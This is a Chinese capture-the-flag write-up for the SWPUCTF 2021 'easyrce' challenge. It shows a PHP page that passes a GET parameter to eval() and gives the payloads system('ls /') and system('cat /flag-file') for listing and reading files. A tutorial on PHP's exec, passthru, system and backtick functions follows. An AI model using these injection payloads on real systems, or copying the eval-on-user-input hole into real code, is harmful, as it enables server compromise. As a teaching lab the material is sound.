# 第一次的RCE WP+补充

[[SWPUCTF 2021 新生赛\]easyrce | NSSCTF](https://www.nssctf.cn/problem/424)

```php+HTML
<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['url']))
{
eval($_GET['url']);
}
```

**if判断语句告诉我们，如果存在url变量则往下面执行eval函数，执行参数并且返回结果。**

- [x]   ?url=system("ls /");
- [x]    ?代表拼接
- [x]    ls /代表列出目录文件，学过Linux系统的大部分都有所了解。
- [x]    代码意思是将外部执行命令ls /的结果赋值给url变量，最后在浏览器中显示结果。
- [x]    注意以 **;** 英文分号进行闭合。

回显结果 `bin boot dev etc flllllaaaaaaggggggg home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var`

**使用cat命令查看flllllaaaaaaggggggg文件中的命令，需注意的是文件在/根目录下：**
  ` ?url=system("cat /flllllaaaaaaggggggg");`

### 知识补充

1. **exec** 执行系统外部命令时不会输出结果，而是返回结果的最后一行，如果你想得到结果你可以使用第二个参数，让其输出到指定的数组，此数组一个记录代表输出的一行，即如果输出结果有20行，则这个数组就有20条记录，所以如果你需要反复输出调用不同系统外部命令的结果，你最好在输出每一条系统外部命令结果时清空这个数组，以防混乱。第三个参数用来取得命令执行的状态码，通常执行成功都是返回０。 
    #示例代码：
    
    ```php+HTML
      <?php
            echo exec("ls",$file);
            echo "</br>";
               `print_r($file);`
            ?>
    
    #输出结果：
        test.php
        Array( [0] => index.php [1] => test.php)
    ```
    
    
2. **passthru**与system的区别，**passthru直接将结果输出到浏览器**，不需要使用 echo 或 return 来查看结果，**不返回任何值**，且其可以输出二进制，比如图像数据。

    ```php+HTML
    #示例代码：
        <?php
            passthru("ls");
        ?>
    #输出结果：
        index.phptest.php
    ```

    
3. **system**和exec的区别在于system在执行系统外部命令时，直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，**如果执行命令成功则返回true，否则返回false**。

    ```php+HTML
    #示例代码：
        <?php
            system("ls /");
        ?>
    #输出结果：
     binbootcgroupdevetchomeliblost+foundmediamntoptprocrootsbinselinuxsrvsystmpusrvar
    ```

    
4. **反撇号**和shell_exec()函数实际上仅是反撇号 (`) 操作符的变体。

    ```php+HTML
    #示例代码：
        <?php
            echo `pwd`;
        ?>
    #输出结果：
        /var/www/html
    ```

    
